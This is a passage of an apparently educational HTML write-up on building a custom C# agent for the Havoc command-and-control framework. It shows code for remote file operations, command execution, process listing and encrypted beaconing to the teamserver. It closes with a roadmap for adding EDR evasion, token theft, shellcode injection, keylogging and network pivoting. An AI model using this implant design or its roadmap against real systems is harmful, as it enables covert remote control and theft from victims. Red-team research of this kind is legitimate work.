+            <h3 class="text-xl font-semibold text-teal-300">8: Filesystem Operations: DispatchFs() + SendFsBlock()</h3>
+            <div class="rounded-xl bg-slate-800/40 p-4 ring-1 ring-slate-600/40 text-sm text-slate-300">
+              <strong class="text-teal-200">Teamserver side:</strong> The teamserver's FS command handler in <code class="text-amber-300 text-xs">commands.go</code> reads the first decrypted 4-byte LE value as the sub-command, then parses the remainder according to the sub-command's specific layout. The result packet must carry <code class="text-amber-300 text-xs">CMD_FS</code> in the plaintext CMD field, and the AES payload must open with <code class="text-amber-300 text-xs">[LEN 4BE][sub 4BE][...operation-specific data...]</code>. The operator client maps each sub-command to a specific UI widget, dir results populate the file browser, pwd results update the path bar.
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20 max-w-full overflow-x-auto">
+<pre class="text-slate-200 text-xs leading-relaxed font-mono"><span class="text-slate-500">// DispatchFs — reads sub-command then routes</span>
+uint sub = ReadLE32(data, 0);   <span class="text-slate-500">// 4 LE bytes from decrypted task</span>
+
+<span class="text-teal-300">case</span> FS_PWD:   <span class="text-slate-500">// sub=9</span>
+{
+    string cwd = Directory.GetCurrentDirectory();
+    SendFsBlock(reqId, sub, ms => { WriteU16String(ms, cwd); });
+    <span class="text-teal-300">break</span>;
+}
+
+<span class="text-slate-500">// SendFsBlock builds the result envelope expected by the teamserver parser:</span>
+<span class="text-slate-500">//   inner = [sub 4BE][operation data]</span>
+<span class="text-slate-500">//   plain = [innerLen 4BE][inner]</span>
+<span class="text-slate-500">// Then calls SendResultPacket(CMD_FS, reqId, plain)</span></pre>
+            </div>
+            <p class="leading-relaxed text-sm text-slate-300">
+              Eight sub-commands are implemented: <strong class="text-slate-100">dir</strong> (1), <strong class="text-slate-100">cd</strong> (4), <strong class="text-slate-100">remove</strong> (5), <strong class="text-slate-100">mkdir</strong> (6), <strong class="text-slate-100">cp</strong> (7), <strong class="text-slate-100">mv</strong> (8), <strong class="text-slate-100">pwd</strong> (9), and <strong class="text-slate-100">cat</strong> (10). Download (sub=2) and upload (sub=3) are intentional gaps. For dir, the code handles two special cases: when the path is empty or <code class="text-amber-300 text-xs">"."</code> it returns the list of logical drives instead of a directory listing, which is what the Havoc file browser sends on its first open; when the path points to a real directory it enumerates files and subdirectories with name, size, type flag, and last-write timestamp in the format the client renders.
+            </p>
+          </div>
+
+          <!-- ── Process execution ── -->
+          <div class="space-y-4">
+            <h3 class="text-xl font-semibold text-teal-300">9: Process Execution: DispatchProc() + RunProcess()</h3>
+            <div class="rounded-xl bg-slate-800/40 p-4 ring-1 ring-slate-600/40 text-sm text-slate-300">
+              <strong class="text-teal-200">Teamserver side:</strong> When the operator runs <code class="text-amber-300 text-xs">shell whoami</code> or <code class="text-amber-300 text-xs">run notepad.exe</code>, the client sends CMD_PROC (0x1010) with sub-command PROC_CREATE=4. The task payload carries a state field (ignored by this agent), the executable path, and the argument string, all as LE length-prefixed UTF-16 strings. The teamserver expects two result packets back: first a CMD_OUTPUT(90) packet carrying the process output, then a CMD_PROC result carrying the PID and success flag to update the process column in the operator client.
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20 max-w-full overflow-x-auto">
+<pre class="text-slate-200 text-xs leading-relaxed font-mono"><span class="text-slate-500">// RunProcess — dual-thread drain prevents pipe deadlock</span>
+string o = "", e = "";
+<span class="text-teal-300">var</span> outThread = <span class="text-teal-300">new</span> Thread(() => { o = p.StandardOutput.ReadToEnd(); });
+<span class="text-teal-300">var</span> errThread = <span class="text-teal-300">new</span> Thread(() => { e = p.StandardError.ReadToEnd();  });
+outThread.IsBackground = <span class="text-teal-300">true</span>; errThread.IsBackground = <span class="text-teal-300">true</span>;
+outThread.Start(); errThread.Start();
+
+bool exited = p.WaitForExit(30000);        <span class="text-slate-500">// 30-second watchdog</span>
+<span class="text-teal-300">if</span> (!exited) { p.Kill(); }               <span class="text-slate-500">// kill hangers, unblocks pipe drain threads</span>
+outThread.Join(5000); errThread.Join(5000);
+
+<span class="text-slate-500">// Two result packets:</span>
+SendOutput(reqId, output);                 <span class="text-slate-500">// CMD_OUTPUT — what the operator sees in the console</span>
+SendProcCreateResult(reqId, proc, pid, ...); <span class="text-slate-500">// CMD_PROC  — PID + success flag</span></pre>
+            </div>
+            <p class="leading-relaxed text-sm text-slate-300">
+              The dual-thread drain is not optional, a single-threaded sequential read (stdout first, then stderr) deadlocks if the child process writes enough bytes to fill the stderr pipe buffer before stdout is exhausted, because the child blocks on its <code class="text-amber-300 text-xs">stderr.Write</code> while the agent is blocked on <code class="text-amber-300 text-xs">stdout.Read</code>. Both pipes must be drained concurrently. Killing the process on timeout closes the child end of both pipes, which signals end-of-file to the read threads and unblocks them naturally without needing an explicit pipe close.
+            </p>
+          </div>
+
+          <!-- ── Process list ── -->
+          <div class="space-y-4">
+            <h3 class="text-xl font-semibold text-teal-300">10: Process List: DispatchProcList()</h3>
+            <div class="rounded-xl bg-slate-800/40 p-4 ring-1 ring-slate-600/40 text-sm text-slate-300">
+              <strong class="text-teal-200">Teamserver side:</strong> The <code class="text-amber-300 text-xs">ps</code> command sends CMD_PROC_LIST(12) with an empty payload. The teamserver's result parser reads a repeating sequence of per-process fields until the decrypted buffer is exhausted — name, PID, WoW64 flag, PPID, session ID, thread count, username. The operator client renders this as the process table and uses the same data to populate the session graph showing process trees.
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20 max-w-full overflow-x-auto">
+<pre class="text-slate-200 text-xs leading-relaxed font-mono"><span class="text-teal-300">foreach</span> (<span class="text-teal-300">var</span> p <span class="text-teal-300">in</span> Process.GetProcesses())
+{
+    WriteU16String(inner, name);          <span class="text-slate-500">// UTF-16 + BE length</span>
+    WriteBE32(inner, (uint)pid);
+    WriteBE32(inner, GetIsWow64(p) ? 1u : 0u);  <span class="text-slate-500">// IsWow64 via P/Invoke to kernel32.IsWow64Process</span>
+    WriteBE32(inner, (uint)ppid);         <span class="text-slate-500">// from NtQueryInformationProcess</span>
+    WriteBE32(inner, (uint)sess);
+    WriteBE32(inner, (uint)thrs);
+    WriteU16String(inner, user);          <span class="text-slate-500">// DOMAIN\username from OpenProcessToken + LookupAccountSid</span>
+}
+<span class="text-slate-500">// Wrap: [LEN 4BE][ProcessUI=0 4BE][per-process records...]</span></pre>
+            </div>
+            <p class="leading-relaxed text-sm text-slate-300">
+              PPID is retrieved with a P/Invoke to <code class="text-amber-300 text-xs">NtQueryInformationProcess(ProcessBasicInformation)</code>, which fills a <code class="text-amber-300 text-xs">PROCESS_BASIC_INFORMATION</code> struct containing the <code class="text-amber-300 text-xs">InheritedFromUniqueProcessId</code> field. Username resolution calls <code class="text-amber-300 text-xs">OpenProcessToken</code> then <code class="text-amber-300 text-xs">LookupAccountSid</code> and both fail silently for system processes, returning an empty string, which the teamserver handles gracefully. The <code class="text-amber-300 text-xs">ProcessUI=0</code> flag in the outer header tells the client this is a full snapshot rather than a live-update stream.
+            </p>
+          </div>
+
+          <!-- ── Result sending ── -->
+          <div class="space-y-4">
+            <h3 class="text-xl font-semibold text-teal-300">11: Result Sending: SendOutput() + SendResultPacket()</h3>
+            <div class="rounded-xl bg-slate-800/40 p-4 ring-1 ring-slate-600/40 text-sm text-slate-300">
+              <strong class="text-teal-200">Teamserver side:</strong> The result handler in <code class="text-amber-300 text-xs">handlers.go</code> reads CMD and REQID from the plaintext header before decrypting the body, which is why those two fields must be unencrypted. CMD routes the packet to the right handler (output parser, FS parser, PROC parser). REQID correlates the result to the originating task so the output appears in the correct operator console pane. The DEMON_OUTPUT parser expects the two-length-prefix structure. The outer length covers inner length field plus data, inner length covers just the data bytes.
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20 max-w-full overflow-x-auto">
+<pre class="text-slate-200 text-xs leading-relaxed font-mono"><span class="text-slate-500">// SendOutput — wraps raw bytes in DEMON_OUTPUT two-level prefix</span>
+uint len = (uint)output.Length;
+WriteBE32(plain, 4 + len);   <span class="text-slate-500">// OUTER: covers INNER field + data</span>
+WriteBE32(plain, len);       <span class="text-slate-500">// INNER: covers data only</span>
+plain.Write(output, ...);
+SendResultPacket(CMD_OUTPUT, reqId, plain.ToArray());
+
+<span class="text-slate-500">// SendResultPacket — encrypts and assembles the wire packet</span>
+<span class="text-teal-300">byte</span>[] enc = AesCtr(aesPlain, _key, _iv); <span class="text-slate-500">// fixed session IV</span>
+WriteBE32(ms, 0);           <span class="text-slate-500">// SIZE placeholder</span>
+WriteBE32(ms, DEMON_MAGIC);
+WriteBE32(ms, _id);
+WriteBE32(ms, cmd);         <span class="text-slate-500">// PLAINTEXT — server reads before decrypt</span>
+WriteBE32(ms, reqId);       <span class="text-slate-500">// PLAINTEXT — correlates output to task</span>
+ms.Write(enc, ...);         <span class="text-slate-500">// AES-encrypted payload</span>
+<span class="text-slate-500">// Backfill SIZE = total bytes after the SIZE field, then POST</span></pre>
+            </div>
+            <p class="leading-relaxed text-sm text-slate-300">
+              The SIZE field is a byte count of everything after itself in the packet. It is assembled last, the packet is built into a MemoryStream, converted to a byte array, and the first four bytes are overwritten with the computed size. CMD and REQID sitting in plaintext before the AES block is a deliberate protocol design decision: the teamserver can route and correlate packets without decrypting them first, which keeps the hot path fast on the server side when many agents are beaconing concurrently.
+            </p>
+          </div>
+
+          <!-- ── Write / Read helpers ── -->
+          <div class="space-y-4">
+            <h3 class="text-xl font-semibold text-teal-300">12: Write / Read Helpers: The Serialisation Layer</h3>
+            <div class="rounded-xl bg-slate-800/40 p-4 ring-1 ring-slate-600/40 text-sm text-slate-300">
+              <strong class="text-teal-200">Teamserver side:</strong> Go's <code class="text-amber-300 text-xs">packer.go</code> writes tasks using <code class="text-amber-300 text-xs">binary.LittleEndian.PutUint32</code> and reads agent results using <code class="text-amber-300 text-xs">binary.BigEndian</code>. This means the direction of traffic determines the endianness, the C# helpers are split into write helpers (big-endian, agent→server) and read helpers (little-endian, server→agent).
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-indigo-500/20 max-w-full overflow-x-auto">
+<pre class="text-slate-200 text-xs leading-relaxed font-mono"><span class="text-slate-500">// ── Write helpers: agent → server, all big-endian ──</span>
+WriteBE32(s, v)     <span class="text-slate-500">// 4-byte big-endian uint (used for headers and integers)</span>
+WriteBE64(s, v)     <span class="text-slate-500">// 8-byte big-endian ulong (file sizes, timestamps)</span>
+WriteBEStr(s, str)  <span class="text-slate-500">// ASCII bytes + [LEN 4BE]  — hostname, username, domain, IP</span>
+WriteBEWStr(s, str) <span class="text-slate-500">// UTF-16 LE bytes + [LEN 4BE] — used for process path in registration</span>
+WriteU16String(s, str) <span class="text-slate-500">// UTF-16 LE bytes + [LEN 4BE] — used for all other wide strings</span>
+WriteBEBytes(s, b)  <span class="text-slate-500">// raw bytes + [LEN 4BE]  — file content, chunk data</span>
+
+<span class="text-slate-500">// ── Read helpers: server → agent, all little-endian ──</span>
+ReadLE32(buf, off)        <span class="text-slate-500">// 4-byte LE uint — CMD, REQID, LEN, sub-commands</span>
+ReadLeUtf16(buf, ref off) <span class="text-slate-500">// LE length-prefixed UTF-16 string — paths, arguments</span></pre>
+            </div>
+            <p class="leading-relaxed text-sm text-slate-300">
+              <code class="text-amber-300 text-xs">WriteBEWStr</code> and <code class="text-amber-300 text-xs">WriteU16String</code> produce the same bytes, both write UTF-16 LE content with a big-endian length prefix but <code class="text-amber-300 text-xs">WriteBEWStr</code> is used only for the process path in the registration payload, where the naming makes the code easier to follow against the teamserver parser. Getting the string encoding wrong (sending UTF-8 where UTF-16 is expected, or a wrong endianness on the length field) is one of the most common reasons a custom agent registers successfully but displays garbled text in the operator client.
+            </p>
+          </div>
+
+        </section>
+      </div>
+    </div>
+    <br>
+
+    <!-- ══ 08 GAPS ═══════════════════════════════════════════════════ -->
+    <div id="gaps" class="rounded-2xl bg-[#04151f] p-10 shadow-xl ring-1 ring-amber-400/20">
+      <div class="relative grid grid-cols-1 gap-10">
+        <section class="space-y-6 text-slate-200">
+          <h2 class="font-mono text-3xl md:text-4xl font-semibold tracking-tight leading-tight text-amber-300">8: Known Gaps and What to Build Next</h2>
+
+          <p class="leading-relaxed">
+            A gap you filled yourself is a technique you understand end-to-end. A gap you copied from a GitHub repository is a technique you are trusting without verification. The cards below name what is missing and why some are OPSEC problems that matter before any operational use, others are features worth building if this becomes a real tool rather than a learning exercise.
+          </p>
+
+          <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 text-sm">
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-red-500/30">
+              <p class="font-semibold text-red-400">OPSEC Critical: No transport encryption (HTTP)</p>
+              <p class="mt-2 leading-relaxed text-slate-300">
+                The agent runs over plain HTTP by default. On plain HTTP the AES session key and IV are transmitted in the registration packet in cleartext; subsequent packets are AES-encrypted but trivially decryptable because the key is already exposed. Set <code class="text-amber-300 text-xs">HTTPS = true</code> to wrap the entire exchange in TLS, hiding the key material from passive interception. The code currently disables certificate validation (accepts any cert, including self-signed); for production use, replace that callback with certificate pinning to also authenticate the server.
+              </p>
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-red-500/30">
+              <p class="font-semibold text-red-400">OPSEC Critical: AES keystream reuse</p>
+              <p class="mt-2 leading-relaxed text-slate-300">
+                The AES-CTR counter resets to the original session IV on every call, so every packet uses the same keystream. This is a many-time pad: XOR any two captured ciphertexts to recover the XOR of their plaintexts, which leaks structure and in favourable cases recovers plaintext entirely. Separately, on plain HTTP the AES key and IV travel in cleartext in the registration packet header (covered in the HTTP transport card above) — an observer who captures that packet can simply regenerate the full keystream from the exposed key and IV and decrypt every subsequent packet directly. These are two independent weaknesses: the many-time pad applies even when the transport is encrypted; the key exposure applies only on HTTP. The fix for the first is to generate a fresh random IV per packet so the keystream never repeats.
+              </p>
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-orange-500/30">
+              <p class="font-semibold text-orange-400">Evasion: Plaintext config strings in the binary</p>
+              <p class="mt-2 leading-relaxed text-slate-300">
+                Running strings against the agent binary immediately reveals the C2 IP address, port, and HTTP User-Agent. A hardened implant stores these in an XOR or AES-encrypted blob that decodes at runtime, zeroes from memory after parsing, and never exists in readable form on disk or in a static scan.
+              </p>
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-orange-500/30">
+              <p class="font-semibold text-orange-400">Evasion: No NTDLL unhooking</p>
+              <p class="mt-2 leading-relaxed text-slate-300">
+                Modern EDR products patch the first bytes of functions in ntdll.dll to redirect execution through their analysis code before the real syscall fires. Techniques such as GhostFart and Perun's Fart remap a clean copy of ntdll from disk before any sensitive API call, removing those hooks entirely. This agent makes no attempt to unhook, which is one of the areas where EDR controls may trigger.
+              </p>
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-orange-500/30">
+              <p class="font-semibold text-orange-400">Evasion: No sleep obfuscation</p>
+              <p class="mt-2 leading-relaxed text-slate-300">
+                During the sleep interval between check-ins, the agent's code and decrypted configuration sit readable in RAM. A memory scanner can find and classify the agent by its in-memory signature even when it is doing nothing. Techniques such as Ekko, Foliage, and Zilean encrypt the agent's own memory before sleeping and decrypt it before waking.
+              </p>
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-yellow-500/30">
+              <p class="font-semibold text-yellow-400">Features: Partial runtime reconfiguration</p>
+              <p class="mt-2 leading-relaxed text-slate-300">
+                The agent handles CMD_SLEEP (11), which updates both the sleep interval and jitter percentage at runtime without redeployment. The teamserver also supports a CONFIG command (ID 2500) that can update kill date and other parameters — the agent has no handler for that command. Adding it requires only an agent-side change with no teamserver modifications needed.
+              </p>
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-yellow-500/30">
+              <p class="font-semibold text-yellow-400">Missing: Many operator commands have no handler</p>
+              <p class="mt-2 leading-relaxed text-slate-300">
+                Any command the agent does not handle is silently ignored thus the operator sees no output and no error. This affects a large portion of what Demon supports: file download and upload, token operations, shellcode injection, in-memory assembly execution, screenshots, keylogging, SOCKS5 proxy, pivoting, BOF execution, and background jobs, among others. The full list is in the capability table below. File download (FS sub-command 2) is a representative example of the pattern: the protocol expects a three-phase chunked sequence, an Open packet carrying the file ID and total size, one or more Write packets of up to 512 KB each, and a Close packet signalling completion or error.
+              </p>
+            </div>
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-yellow-500/30">
+              <p class="font-semibold text-yellow-400">Reliability: Single C2 host with no failover</p>
+              <p class="mt-2 leading-relaxed text-slate-300">
+                The agent targets a single hardcoded C2 address and retries indefinitely on failure, but it has no failover path. If that host becomes permanently unavailable the agent will loop retrying the same dead endpoint until the process is killed. A production implant maintains a priority-ordered list of C2 hosts and rotates to the next one after a configurable number of consecutive failures.
+              </p>
+            </div>
+
+            <div class="rounded-lg bg-[#1e293b] p-4 ring-1 ring-cyan-500/30 sm:col-span-2">
+              <p class="font-semibold text-cyan-400">Missing Capabilities: Operational Gaps</p>
+              <p class="mt-2 leading-relaxed text-slate-300">
+                The agent handles: sleep and jitter updates (CMD_SLEEP), filesystem operations (dir, cd, pwd, mkdir, remove, cat, cp, mv), process listing (CMD_PROC_LIST), process creation with output capture and a 30-second watchdog, process kill, and exit. Everything else Demon supports is absent. The table below maps each missing capability to its Havoc operator command so a developer knows exactly what to research and implement next.
+              </p>
+              <div class="mt-4 overflow-x-auto rounded-lg">
+                <table class="min-w-full text-sm">
+                  <thead>
+                    <tr class="bg-slate-900/60 text-gray-400 text-xs uppercase tracking-wider">
+                      <th class="px-4 py-3 text-left">Capability</th>
+                      <th class="px-4 py-3 text-left">Operator Command</th>
+                      <th class="px-4 py-3 text-left">What to Implement</th>
+                    </tr>
+                  </thead>
+                  <tbody class="divide-y divide-cyan-700/20 text-slate-300">
+                    <tr class="hover:bg-cyan-900/10">
+                      <td class="px-4 py-3 font-semibold text-cyan-300">Token Operations</td>
+                      <td class="px-4 py-3 font-mono text-xs text-amber-300">token steal / make / list / revert / getuid</td>
+                      <td class="px-4 py-3 text-xs leading-relaxed">Handle CMD_TOKEN sub-commands: steal a token from a target PID via <code class="text-amber-300">OpenProcessToken</code>, impersonate it with <code class="text-amber-300">ImpersonateLoggedOnUser</code>, revert with <code class="text-amber-300">RevertToSelf</code>, and enumerate available tokens. Required for any privilege escalation or lateral movement workflow.</td>
+                    </tr>
+                    <tr class="hover:bg-cyan-900/10">
+                      <td class="px-4 py-3 font-semibold text-cyan-300">Shellcode Injection</td>
+                      <td class="px-4 py-3 font-mono text-xs text-amber-300">inject / shinject</td>
+                      <td class="px-4 py-3 text-xs leading-relaxed">Open a remote process, allocate executable memory with <code class="text-amber-300">VirtualAllocEx</code>, write shellcode via <code class="text-amber-300">WriteProcessMemory</code>, and spawn a thread with <code class="text-amber-300">CreateRemoteThread</code>. The harder version uses indirect syscalls or <code class="text-amber-300">NtCreateThreadEx</code> to avoid EDR hooks on the thread-creation path.</td>
+                    </tr>
+                    <tr class="hover:bg-cyan-900/10">
+                      <td class="px-4 py-3 font-semibold text-cyan-300">In-Memory .NET Execution</td>
+                      <td class="px-4 py-3 font-mono text-xs text-amber-300">execute-assembly</td>
+                      <td class="px-4 py-3 text-xs leading-relaxed">Host the CLR in-process via <code class="text-amber-300">ICLRRuntimeHost</code>, load the assembly bytes from the MEM_FILE staging buffer, and execute its entry point. Stdout must be redirected through a pipe so output returns to the operator. Requires MEM_FILE support to be implemented first.</td>
+                    </tr>
+                    <tr class="hover:bg-cyan-900/10">
+                      <td class="px-4 py-3 font-semibold text-cyan-300">Inline PE Execution</td>
+                      <td class="px-4 py-3 font-mono text-xs text-amber-300">inline-execute</td>
+                      <td class="px-4 py-3 text-xs leading-relaxed">Manually map a PE into memory: parse the headers, allocate sections with correct permissions, apply base relocations, resolve imports, and call the entry point, all without touching disk. This is the reflective DLL loading technique. Crash isolation is the main challenge; a bad PE can kill the agent process.</td>
+                    </tr>
+                    <tr class="hover:bg-cyan-900/10">
+                      <td class="px-4 py-3 font-semibold text-cyan-300">Screenshot</td>
+                      <td class="px-4 py-3 font-mono text-xs text-amber-300">screenshot</td>
+                      <td class="px-4 py-3 text-xs leading-relaxed">Capture the desktop with <code class="text-amber-300">BitBlt</code> from the screen DC into a memory DC, encode as PNG or BMP, and return via <code class="text-amber-300">CMD_OUTPUT</code>. In C# the entire capture fits in a few lines with <code class="text-amber-300">Graphics.CopyFromScreen</code> and <code class="text-amber-300">Bitmap.Save</code>. The operator client renders it inline.</td>
+                    </tr>
+                    <tr class="hover:bg-cyan-900/10">
+                      <td class="px-4 py-3 font-semibold text-cyan-300">Keylogging</td>
+                      <td class="px-4 py-3 font-mono text-xs text-amber-300">keylog</td>
+                      <td class="px-4 py-3 text-xs leading-relaxed">Install a low-level keyboard hook via <code class="text-amber-300">SetWindowsHookEx(WH_KEYBOARD_LL)</code> on a background thread. Buffer keystrokes with the active window title for context and flush the log to the operator on each check-in via <code class="text-amber-300">CMD_OUTPUT</code>. Hook must be removed cleanly on agent exit.</td>
+                    </tr>
+                    <tr class="hover:bg-cyan-900/10">
+                      <td class="px-4 py-3 font-semibold text-cyan-300">Socks5 Proxy</td>
+                      <td class="px-4 py-3 font-mono text-xs text-amber-300">socks</td>
+                      <td class="px-4 py-3 text-xs leading-relaxed">The teamserver opens a local Socks5 listener and tunnels TCP connections through the agent's HTTP channel. The agent must handle CMD_SOCKET sub-commands to open connections, relay data, and close sockets on demand. Each connection is identified by a channel ID. This turns the agent into a full network proxy for the operator's tools.</td>
+                    </tr>
+                    <tr class="hover:bg-cyan-900/10">
+                      <td class="px-4 py-3 font-semibold text-cyan-300">SMB / TCP Pivot</td>
+                      <td class="px-4 py-3 font-mono text-xs text-amber-300">pivot</td>
+                      <td class="px-4 py-3 text-xs leading-relaxed">Connect to another Demon agent on an internal host that has no direct internet access via a named pipe or TCP socket, relay its traffic through this agent's HTTP channel, and make it appear as a child session in the teamserver. Requires CMD_PIVOT handling and the SMB named-pipe protocol that Demon's PackageTransmitAll uses.</td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+
+          </div>
+
+        </section>
+      </div>
+    </div>
+
+  </main>
+
+  <footer class="relative flex items-center justify-center text-[15px] text-slate-300 py-6">
+      <div class="text-center">
+        Crafted with Passion<br>
+        2025 © Iron Hulk - All Rights Reserved.
+        <br><br>
+        <a href="../projects.html" class="text-slate-300 text-sm px-4 py-2 rounded transition">← Back to Project</a>
+      </div>
+      <a href="#top" class="absolute right-6 top-1/2 transform -translate-y-1/2 text-slate-300 hover:text-slate-700">
+        <svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5" viewBox="0 0 20 20" fill="currentColor">
+          <path fill-rule="evenodd" d="M3.707 10.707a1 1 0 01-1.414-1.414l7-7a1 1 0 011.414 0l7 7a1 1 0 11-1.414 1.414L11 4.414V19a1 1 0 11-2 0V4.414L3.707 10.707z" clip-rule="evenodd" />
+        </svg>
+      </a>
+    </footer>
+
+  <script>
+    const article = document.getElementById('article');
+    if (article) {
+      const words = article.innerText.trim().split(/\s+/).length;
+      const mins = Math.max(1, Math.round(words / 200));
+      const el = document.getElementById('reading-time');
+      if (el) el.textContent = mins + ' min read';
+    }
+  </script>
+
+</body>
+</html>
